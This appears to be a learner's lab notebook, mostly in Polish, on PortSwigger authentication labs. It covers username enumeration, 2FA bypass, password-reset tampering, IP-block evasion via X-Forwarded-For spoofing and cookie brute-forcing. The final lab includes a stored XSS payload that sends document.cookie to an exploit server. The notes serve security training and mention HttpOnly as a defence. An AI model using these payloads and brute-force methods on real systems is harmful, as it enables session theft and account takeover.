<br><br>
<hr>
<br><br>
<h2>Lab: Username enumeration via different responses</h2>

Najpierw brute force słownikowy na username i następnie na password. Solved.

<br><br>
<hr>
<br><br>
<h2>Lab: 2FA simple bypass</h2>

Najpierw przejść prawilną ścieżkę logowania 2fa na swoje konto. /my-account?id=wiener

Wylogowac. Zalogowac na ofiare. W momencie podania 4 digits 2fa > zmieniam url na > /my-account?id=carlos

<br><br>
<hr>
<br><br>
<h2>Lab: Password reset broken logic</h2>

Przejść cala sciezke forgot password u siebie i w przechwyconym request podmienić usera na carlos.


Body zmiany hasła z podmienionym userem:

temp-forgot-password-token=c0w3t5gqzh5bgy2z6yb2qg9u01gngtny&username=carlos&new-password-1=123&new-password-2=123

<br><br>
<hr>
<br><br>
<h2>Lab: Username enumeration via subtly different responses</h2>

Robie pierwszy skan brute force login i dostaje wszędzie 200 i „Invalid login or password”. Puszczam drugi atak bf. Settings>Grep – Extract> Invalid login or password

Grep Extract: zaznaczam myszką cały fragment "Invalid. ." i z tego sama automatycznie tworzy się reguła.

<img width="1246" height="607" alt="image" src="https://github.com/user-attachments/assets/c960fabd-4c8e-464a-a363-f898cbb4e9a7" />

<br>

<img width="1420" height="349" alt="image" src="https://github.com/user-attachments/assets/54dfff0e-f08c-43c3-bd6c-944c1c32a970" />

<br><br>
<hr>
<br><br>
<h2>Lab: Username enumeration via response timings</h2>

Utrudnienie: To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.

Ustawienie ataku: 
+ X-Forwarded-For header (Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.)
+ brute force username 
+ Set the password to a very long string of characters (about 100 characters should do it).

<img width="1264" height="664" alt="image" src="https://github.com/user-attachments/assets/101dad26-dc02-4932-8bef-39063d805fcc" />

<br>

<img width="1431" height="349" alt="image" src="https://github.com/user-attachments/assets/0c1519a7-ffd0-475a-becb-920ab24fcecc" />

<br>

<img width="1243" height="604" alt="image" src="https://github.com/user-attachments/assets/750529f5-02e4-4d93-b1dc-4fd6cf053e86" />

<br><br>
<hr>
<br><br>
<h2>Lab: Broken brute-force protection, IP block</h2>

Utrudnienie: your IP is temporarily blocked if you submit 3 incorrect logins in a row.

<br>

Pitchwork atak - parowanie (czyli username payload wiener musi byc na tej samej pozycji co password payload peter)

<img width="771" height="367" alt="image" src="https://github.com/user-attachments/assets/82ac568f-9bd6-44bf-ac3d-e60d6e53ed8b" />

<br>

Click Resource pool to open the Resource pool side panel, then add the attack to a resource pool with Maximum concurrent requests set to 1

<img width="1531" height="730" alt="image" src="https://github.com/user-attachments/assets/1d7654b6-63e2-45e6-beb7-348c09675e12" />

<br>

username: lista 100x "wiener carlos"
password: każde hasło z listy poprzedzam "moim" haslem czyli peter

<img width="1497" height="533" alt="image" src="https://github.com/user-attachments/assets/f29f3424-cef6-46af-8a64-5aa49d55d8cd" />

<br>

solved

<br>
<img width="1154" height="570" alt="image" src="https://github.com/user-attachments/assets/ae8b5743-4ade-41f3-a49f-d912d097bc80" />


<br><br>
<hr>
<br><br>
<h2>Lab: Username enumeration via account lock</h2>

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw.

<br>
First attack Cluster bomb attack - kazda mozliwa kombinacja payloadow
<br>

Cluster bomb attack > Add a payload position to the username parameter > Add a blank payload position to the end of the
request body by clicking Add §. The result should look something like this:

username=$invalid-username$&password=example$$



<br>

In the Payloads side panel, add the list of usernames for the first payload position.
For the second payload position, select the Null payloads type and choose the option
to generate 5 payloads. This will effectively cause each username to be repeated 5
times. Start the attack.

<br>

<img width="1540" height="616" alt="image" src="https://github.com/user-attachments/assets/0142b1e6-b83d-4169-b71f-a0a4ff4bd294" />

<br>

In the Payloads side panel, add the list of usernames for the first payload position.
For the second payload position, select the Null payloads type and choose the option
to generate 5 payloads. This will effectively cause each username to be repeated 5
times. Start the attack.

<br>

<img width="1367" height="583" alt="image" src="https://github.com/user-attachments/assets/4bcbbf3d-64e7-4f2d-a497-756deededcbe" />

<br>

Second attack Sniper attack

Add the list of passwords to the payload set and create a grep extraction rule for the
error message. Start the attack.
In the results, look at the grep extract column. Notice that there are a couple of
different error messages, but one of the responses did not contain any error message.
Make a note of this password.


<img width="1525" height="633" alt="image" src="https://github.com/user-attachments/assets/a4c9a437-a0b4-4d69-9107-af168984c202" />

<img width="1190" height="579" alt="image" src="https://github.com/user-attachments/assets/68366c45-ef03-4e4b-b01b-16867e695157" />

<br><br>
<hr>
<br><br>
<h2>Lab: 2FA Broken Logic</h2>

1. loguję się prawilnie z 2FA na moje konto wiener:peter
2. w repeater znalez wlasciwy (bez 2fa w body) /login2 wiener zamien na carlos (!!!kod teraz jest generowany dla carlosa)
3. log out w przeglądarce
4. ponownie w przegladarce zaloguj sie na wiener:peter
5. wpisz invalid 2fa token
6. burp: z http history /login2 z mfa > intruder > wiener na carlos > payloadtype: bruteforce (dzięki brute force dowiemy się jaki kod zostal wygenerowany dla carlos)
7. w repeater /login2 z mfa wprowadzamy poprawne dane (carlos i mfa) > reqest in browser in ORYGINAL session

<img width="1188" height="472" alt="image" src="https://github.com/user-attachments/assets/72171c6f-e9fd-4d98-b03e-3940487d1bfc" />

<img width="1129" height="533" alt="image" src="https://github.com/user-attachments/assets/e39a5a93-85ce-4630-a4f0-9c645726c612" />
<img width="1129" height="533" alt="image" src="https://github.com/user-attachments/assets/6d2fc9ae-11d9-44f4-8e1e-b9b129c7659c" />

<img width="1150" height="210" alt="image" src="https://github.com/user-attachments/assets/37cf2e62-60cb-4b2a-a5ee-2135cf98889b" />
<img width="1180" height="534" alt="image" src="https://github.com/user-attachments/assets/94cf0dd8-2bd6-4f9e-a6f0-43329a222bc8" />

<img width="664" height="261" alt="image" src="https://github.com/user-attachments/assets/6eb91df4-f275-43e3-861e-ef3d2b93068e" />



Load the 302 response in the browser.

<br><br>
<hr>
<br><br>
<h2>Lab: Brute Forcing a Stay Logged In Cookie</h2>

1. loguje sie na wiener:peter checkbox on: stay logged in
2. repeater > /my-account?id=wiener staylogged cookie jest w base64 (md5 ma ten sam hash co kodowanie base64?)
3. log out.
4. intruder GET /my-account?id=carlos > paste password list r > add rules > A.hash md5 > B. add prefix carlosr: > C.base64 encode > D. Grep Match "update email" (wiemy bo pierwszy BF poszedł na peter wiener
5. request in browser in ORIGINAL SESSION

<img width="1043" height="341" alt="image" src="https://github.com/user-attachments/assets/d4d2a3b9-bc2c-4adf-a731-ac707f36a3b7" />
<img width="1468" height="657" alt="image" src="https://github.com/user-attachments/assets/0df7b30f-df48-46a1-95f9-6f158f7764a9" />


mi sie udalo bez grep match bo znalazlam 200

<img width="1195" height="252" alt="image" src="https://github.com/user-attachments/assets/9de732f0-0b48-48d3-a9c0-5e6a3827861f" />


<br><br>
<hr>
<br><br>
<h2>Lab: Offline Password Cracking</h2>

1. w sekcji komentarzy wklejamy skrypt ze swoim expoit serverem
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
payload explanation:
attacker control domain + <script>  tag HTML, który mówi przeglądarce: „Uruchom kod JavaScript”. + js will be executed in any visitor browser > document to obiekt w JavaScript, który reprezentuje aktualnie otwartą stronę HTML i ma dostęp do: cookies, formularze, elementy strony, URL > document.location oznacza adres URL aktualnej strony i można go zmieniać: document.location = "https://example.com" czyli działa jak redirect > 

short
JavaScript pobiera cookies użytkownika (document.cookie) i przekierowuje przeglądarkę (document.location) na serwer atakującego, przekazując te cookies w adresie URL.

ochrona
HttpOnly
Wtedy: document.cookie nie zwróci cookie sesji

2. exploit server: obserwujemy access log


<img width="736" height="566" alt="image" src="https://github.com/user-attachments/assets/224da8b7-0887-4b66-a9e0-71f0d97bf8ec" />

